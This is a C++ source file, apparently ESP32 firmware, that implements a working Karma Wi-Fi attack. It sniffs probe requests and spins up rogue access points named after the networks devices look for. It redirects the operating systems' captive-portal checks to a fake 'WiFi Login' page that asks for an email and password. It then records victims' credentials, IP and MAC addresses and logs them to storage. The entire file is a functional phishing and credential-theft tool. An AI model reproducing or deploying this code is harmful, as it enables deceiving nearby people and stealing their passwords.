#include "karma_attack.h"
#include "cyber_storage.h"
#include <string.h>

KarmaAttack* KarmaAttack::_instance = nullptr;

// Portal HTML template - %SSID% replaced at serve time
static const char PORTAL_HTML_TPL[] PROGMEM = R"HTML(<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
     background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:rgba(255,255,255,0.97);border-radius:20px;padding:40px 32px;
      width:340px;max-width:92vw;box-shadow:0 20px 60px rgba(0,0,0,0.4)}
.wifi-icon{text-align:center;font-size:48px;margin-bottom:12px}
.ssid{text-align:center;font-size:18px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
.sub{text-align:center;font-size:13px;color:#666;margin-bottom:28px}
label{display:block;font-size:12px;font-weight:600;color:#444;
      text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
input{width:100%;padding:13px 16px;border:2px solid #e0e0e0;border-radius:12px;
      font-size:15px;outline:none;transition:border .2s;margin-bottom:16px}
input:focus{border-color:#0f3460}
button{width:100%;padding:14px;background:linear-gradient(135deg,#0f3460,#1a5276);
       color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;
       cursor:pointer;letter-spacing:.3px}
button:active{opacity:.9}
.footer{text-align:center;font-size:11px;color:#aaa;margin-top:16px}
</style></head><body>
<div class="card">
  <div class="wifi-icon">&#128246;</div>
  <div class="ssid">%SSID%</div>
  <div class="sub">Sign in to continue to the internet</div>
  <form method="POST" action="/login">
    <label>Email or Username</label>
    <input type="text" name="user" placeholder="Enter your email" autocomplete="off">
    <label>Password</label>
    <input type="password" name="pass" placeholder="Enter password">
    <button type="submit">Connect &#8594;</button>
  </form>
  <div class="footer">&#128274; Secured network authentication</div>
</div></body></html>)HTML";

static const char SUCCESS_HTML[] PROGMEM = R"HTML(<!DOCTYPE html><html><head>
<meta charset="utf-8"><title>Connected</title>
<style>body{font-family:-apple-system,sans-serif;text-align:center;padding:80px 20px}</style>
</head><body><h2 style="color:#30d158">&#10003; Connected</h2><p>You are now connected.</p>
</body></html>)HTML";

// ── Lifecycle ──────────────────────────────────────────────────────────────
void KarmaAttack::begin() {
  _running=false; _scanning=false; _scanCount=0;
  _credCount=0; _lastSSID=""; _lastProbe=""; _currentAP="";
  _portalServer=nullptr; _dns=nullptr;
  _instance=this;
}

int KarmaAttack::scan() {
  _scanning=true; _scanCount=0;
  Serial.println("Karma: scanning for target networks...");
  int found = WiFi.scanNetworks(false, true);
  if(found>0){
    _scanCount = min(found, MAX_KARMA_SSIDS);
    for(int i=0;i<_scanCount;i++){
      strncpy(_targets[i].ssid, WiFi.SSID(i).c_str(), 32);
      _targets[i].ssid[32]='\0';
      _targets[i].selected=false;
      Serial.printf("  [%d] %s\n", i, _targets[i].ssid);
    }
    WiFi.scanDelete();
  }
  _scanning=false;
  Serial.printf("Karma: found %d networks\n", _scanCount);
  return _scanCount;
}

void KarmaAttack::select(int idx, bool on) {
  if(idx>=0 && idx<_scanCount) _targets[idx].selected=on;
}
void KarmaAttack::selectAll()      { for(int i=0;i<_scanCount;i++) _targets[i].selected=true; }
void KarmaAttack::clearSelection() { for(int i=0;i<_scanCount;i++) _targets[i].selected=false; }

bool KarmaAttack::start() {
  _running=true; _credCount=0; _lastCheck=0;
  _lastSSID=""; _lastProbe=""; _currentAP="";

  // If no targets selected, respond to ALL probes (original behaviour)
  bool anySelected=false;
  for(int i=0;i<_scanCount;i++) if(_targets[i].selected){ anySelected=true; break; }
  if(!anySelected){
    Serial.println("Karma: no targets selected — responding to ALL probes");
  } else {
    Serial.println("Karma: responding only to selected targets:");
    for(int i=0;i<_scanCount;i++)
      if(_targets[i].selected)
        Serial.printf("  -> %s\n", _targets[i].ssid);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  return true;
}

void KarmaAttack::stop() {
  _running=false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  delay(50);
  esp_wifi_set_promiscuous(false);
  stopPortal();
  WiFi.softAP("ESP32-Cyber","esp32cyber");
  Serial.printf("Karma: STOPPED. creds=%d\n", _credCount);
}

// ── Sniffer ────────────────────────────────────────────────────────────────
void KarmaAttack::snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if(!_instance || !_instance->_running) return;
  if(type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  _instance->handleProbe(pkt->payload, pkt->rx_ctrl.sig_len);
}

bool KarmaAttack::_targetSelected(const char* ssid) {
  // If nothing selected, match everything
  bool anySelected=false;
  for(int i=0;i<_scanCount;i++) if(_targets[i].selected){ anySelected=true; break; }
  if(!anySelected) return true;
  for(int i=0;i<_scanCount;i++)
    if(_targets[i].selected && strncmp(_targets[i].ssid,ssid,32)==0) return true;
  return false;
}

void KarmaAttack::handleProbe(const uint8_t* payload, int len) {
  if(len<28) return;
  if(payload[0]!=0x40 || payload[1]!=0x00) return;
  if(payload[24]!=0x00) return;
  uint8_t ssidLen=payload[25];
  if(ssidLen==0 || ssidLen>32 || 26+ssidLen>len) return;
  char ssid[33];
  memcpy(ssid,&payload[26],ssidLen); ssid[ssidLen]='\0';
  if(String(ssid)=="ESP32-Cyber") return;
  if(_currentAP==String(ssid)) return;   // already running this one
  if(!_targetSelected(ssid)) return;     // not in our target list

  _lastProbe=String(ssid);
  Serial.printf("Karma: probe matched '%s'\n", ssid);
  startPortal(ssid);
}

// ── Portal ─────────────────────────────────────────────────────────────────
void KarmaAttack::startPortal(const char* ssid) {
  esp_wifi_set_promiscuous(false);
  stopPortal();

  WiFi.softAP(ssid, nullptr, 6, 0, 4);
  delay(300);
  _currentAP=String(ssid);
  _lastSSID=_currentAP;
  Serial.printf("Karma: AP '%s' created — portal up\n", ssid);

  IPAddress ip = WiFi.softAPIP();

  _dns = new DNSServer();
  _dns->setErrorReplyCode(DNSReplyCode::NoError);
  _dns->start(53,"*",ip);

  _portalServer = new WebServer(80);

  // Captive portal detection endpoints — must REDIRECT to trigger auto-open browser
  // iOS expects Success page at /hotspot-detect.html — redirect triggers captive portal UI
  _portalServer->on("/hotspot-detect.html",           [this](){ redirectToPortal(); });
  _portalServer->on("/library/test/success.html",     [this](){ redirectToPortal(); });
  _portalServer->on("/success.html",                  [this](){ redirectToPortal(); });
  // Android connectivity check — expects 204, redirect triggers captive portal UI
  _portalServer->on("/generate_204",                  [this](){ redirectToPortal(); });
  _portalServer->on("/gen_204",                       [this](){ redirectToPortal(); });
  // Windows
  _portalServer->on("/connecttest.txt",               [this](){ redirectToPortal(); });
  _portalServer->on("/ncsi.txt",                      [this](){ redirectToPortal(); });
  _portalServer->on("/redirect",                      [this](){ redirectToPortal(); });
  _portalServer->on("/wpad.dat",                      [this](){ redirectToPortal(); });
  _portalServer->on("/chat",                          [this](){ redirectToPortal(); });
  // Main portal routes
  _portalServer->on("/",          [this](){ handleRoot();   });
  _portalServer->on("/login", HTTP_POST, [this](){ handleLogin();  });
  _portalServer->on("/success",   [this](){ handleSuccess(); });
  _portalServer->onNotFound(      [this](){ handleNotFound(); });
  _portalServer->begin();

  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCb);
}

void KarmaAttack::stopPortal() {
  if(_portalServer){ _portalServer->stop(); delete _portalServer; _portalServer=nullptr; }
  if(_dns)         { _dns->stop();          delete _dns;          _dns=nullptr;          }
}

void KarmaAttack::serveCaptive() {
  // Load template and inject current SSID
  String html;
  html.reserve(4096);
  const char* p = PORTAL_HTML_TPL;
  while(pgm_read_byte(p)) html += (char)pgm_read_byte(p++);
  String ssidDisplay = _currentAP.length() ? _currentAP : "WiFi Network";
  html.replace("%SSID%", ssidDisplay);
  if(_portalServer) _portalServer->send(200,"text/html",html);
}

// Public version for main web server preview
String KarmaAttack::getPortalHtml(const String& ssidOverride) {
  String html;
  html.reserve(4096);
  const char* p = PORTAL_HTML_TPL;
  while(pgm_read_byte(p)) html += (char)pgm_read_byte(p++);
  String ssid = ssidOverride.length() ? ssidOverride : (_currentAP.length() ? _currentAP : "WiFi Network");
  html.replace("%SSID%", ssid);
  return html;
}

void KarmaAttack::redirectToPortal() {
  // Redirect to our login page — this is what triggers the OS captive portal popup
  // and auto-opens the browser without user having to manually navigate
  String loginUrl = "http://" + WiFi.softAPIP().toString() + "/";
  _portalServer->sendHeader("Location", loginUrl, true);
  // Use 302 (temporary redirect) — some OSes require specific codes:
  // iOS needs the redirect to not be cached
  _portalServer->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  _portalServer->sendHeader("Pragma", "no-cache");
  _portalServer->send(302, "text/plain", "");
}

void KarmaAttack::handleRoot() {
  String ip = _portalServer->client().remoteIP().toString();
  String ua = _portalServer->hasHeader("User-Agent") ?
              _portalServer->header("User-Agent") : "unknown";

  // MAC lookup using DHCP sequential order
  String mac = "unknown";
  wifi_sta_list_t sta; memset(&sta,0,sizeof(sta));
  if(esp_wifi_ap_get_sta_list(&sta)==ESP_OK && sta.num>0){
    int dot = ip.lastIndexOf('.');
    int idx2 = (dot>=0) ? ip.substring(dot+1).toInt()-2 : 0;
    if(idx2>=0 && idx2<(int)sta.num){
      uint8_t* m=sta.sta[idx2].mac; char mb[18];
      snprintf(mb,18,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
      mac=String(mb);
    }
  }

  // Log unique connections
  bool seen=false;
  for(int i=0;i<_connCount;i++) if(_conns[i].ip==ip){seen=true;break;}
  if(!seen && _connCount<MAX_KARMA_CONNS){
    _conns[_connCount++]={ip,mac,ua,_currentAP,millis()};
    Serial.printf("Karma: CONNECT IP=%s MAC=%s\n",ip.c_str(),mac.c_str());
  }
  serveCaptive();
}
void KarmaAttack::handleLogin() {
  if(_credCount>=MAX_KARMA_CREDS){
    _portalServer->sendHeader("Location","/success",true);
    _portalServer->send(302,"text/plain","");
    return;
  }
  String user=_portalServer->hasArg("user")?_portalServer->arg("user"):"";
  String pass=_portalServer->hasArg("pass")?_portalServer->arg("pass"):"";
  String ip  =_portalServer->client().remoteIP().toString();

  String mac="N/A";
  wifi_sta_list_t sta;
  if(esp_wifi_ap_get_sta_list(&sta)==ESP_OK && sta.num>0){
    char mb[18]; uint8_t* m=sta.sta[0].mac;
    sprintf(mb,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
    mac=String(mb);
  }

  KarmaCred c; c.user=user;c.pass=pass;c.ip=ip;c.mac=mac;c.ssid=_currentAP;
  _creds[_credCount++]=c;
  cyberStorage.saveCred("karma", _currentAP, user, pass, ip);
  cyberStorage.addLog("cred", "Karma: "+_currentAP+" user="+user);

  Serial.println("╔══════════════════════════════════════╗");
  Serial.println("║      KARMA — CREDENTIAL CAUGHT       ║");
  Serial.println("╠══════════════════════════════════════╣");
  Serial.printf( "║ SSID : %-30s║\n",_currentAP.c_str());
  Serial.printf( "║ IP   : %-30s║\n",ip.c_str());
  Serial.printf( "║ MAC  : %-30s║\n",mac.c_str());
  Serial.printf( "║ User : %-30s║\n",user.c_str());
  Serial.printf( "║ Pass : %-30s║\n",pass.c_str());
  Serial.println("╚══════════════════════════════════════╝");

  _portalServer->sendHeader("Location","/success",true);
  _portalServer->send(302,"text/plain","");
}

void KarmaAttack::handleSuccess() {
  char buf[512];
  strncpy_P(buf,SUCCESS_HTML,sizeof(buf)-1); buf[sizeof(buf)-1]='\0';
  _portalServer->send(200,"text/html",buf);
}

void KarmaAttack::handleNotFound() {
  // Redirect everything to portal
  _portalServer->sendHeader("Location","http://"+WiFi.softAPIP().toString()+"/",true);
  _portalServer->send(302,"text/plain","");
}

// ── Tick ───────────────────────────────────────────────────────────────────
void KarmaAttack::tick() {
  if(!_running) return;
  if(_portalServer) _portalServer->handleClient();
  if(_dns)          _dns->processNextRequest();

  uint32_t now=millis();
  if(now-_lastCheck<5000) return;
  _lastCheck=now;

  static uint8_t ch=1;
  if(!_portalServer){ esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE); ch=(ch%11)+1; }
  Serial.printf("Karma: creds=%d ap='%s'\n",_credCount,_currentAP.c_str());
}
